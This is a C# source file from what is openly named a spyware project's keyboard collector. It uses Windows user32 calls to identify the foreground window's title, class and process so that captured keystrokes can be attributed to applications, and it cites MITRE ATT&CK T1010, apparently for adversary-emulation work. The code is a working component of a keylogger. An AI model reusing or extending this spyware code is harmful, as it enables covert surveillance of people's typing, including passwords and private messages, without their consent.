using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;

namespace Spyware.Collectors.Keyboard;

/// <summary>Ventana en primer plano: título + proceso (T1010 Application Window Discovery).</summary>
public readonly record struct WindowInfo(IntPtr Handle, string Title, string ProcessName)
{
    public static WindowInfo Unknown { get; } = new(IntPtr.Zero, string.Empty, string.Empty);

    public bool IsSameWindowAs(IntPtr handle) => Handle == handle;
}

/// <summary>
/// Averigua qué ventana está recibiendo el teclado con <c>GetForegroundWindow</c>,
/// <c>GetWindowTextW</c>, <c>GetClassNameW</c> y <c>GetWindowThreadProcessId</c>.
/// Muchas ventanas UWP/XAML vienen sin título: se usa la clase como respaldo.
/// </summary>
public static class ForegroundWindow
{
    private const int MaxTitleCharacters = 200;

    public static WindowInfo Describe()
    {
        IntPtr window = GetForegroundWindow();
        if (window == IntPtr.Zero)
            return WindowInfo.Unknown;

        string title = ReadTitle(window);
        if (string.IsNullOrWhiteSpace(title))
            title = ReadClassName(window);

        return new WindowInfo(window, Truncate(title), ReadProcessName(window));
    }

    /// <summary>Solo el HWND: sirve para detectar el cambio de foco sin consultar más API.</summary>
    public static IntPtr CurrentHandle() => GetForegroundWindow();

    private static string Truncate(string value) =>
        value.Length <= MaxTitleCharacters ? value : value[..MaxTitleCharacters];

    private static string ReadTitle(IntPtr window)
    {
        int characters = GetWindowTextLength(window);
        if (characters <= 0)
            return string.Empty;

        var buffer = new StringBuilder(characters + 1);
        int copied = GetWindowText(window, buffer, buffer.Capacity);
        return copied <= 0 ? string.Empty : buffer.ToString(0, Math.Min(copied, characters));
    }

    private static string ReadClassName(IntPtr window)
    {
        var buffer = new StringBuilder(257);
        int copied = GetClassName(window, buffer, buffer.Capacity);
        return copied <= 0 ? string.Empty : buffer.ToString(0, copied);
    }

    private static string ReadProcessName(IntPtr window)
    {
        uint processId = GetWindowThreadProcessId(window, out uint pid);
        if (processId == 0 || pid == 0)
            return string.Empty;

        try
        {
            using Process process = Process.GetProcessById((int)pid);
            return process.ProcessName;
        }
        catch (Exception ex) when (ex is ArgumentException or System.ComponentModel.Win32Exception or InvalidOperationException)
        {
            // Proceso ya terminado o sin permisos para leer su nombre.
            return "pid-" + pid;
        }
    }

    // ---------- API de Windows ----------

    [DllImport("user32.dll")]
    private static extern IntPtr GetForegroundWindow();

    [DllImport("user32.dll", EntryPoint = "GetWindowTextW", CharSet = CharSet.Unicode)]
    private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

    [DllImport("user32.dll", EntryPoint = "GetWindowTextLengthW")]
    private static extern int GetWindowTextLength(IntPtr hWnd);

    [DllImport("user32.dll", EntryPoint = "GetClassNameW", CharSet = CharSet.Unicode)]
    private static extern int GetClassName(IntPtr hWnd, StringBuilder lpClassName, int nMaxCount);

    [DllImport("user32.dll")]
    private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
}
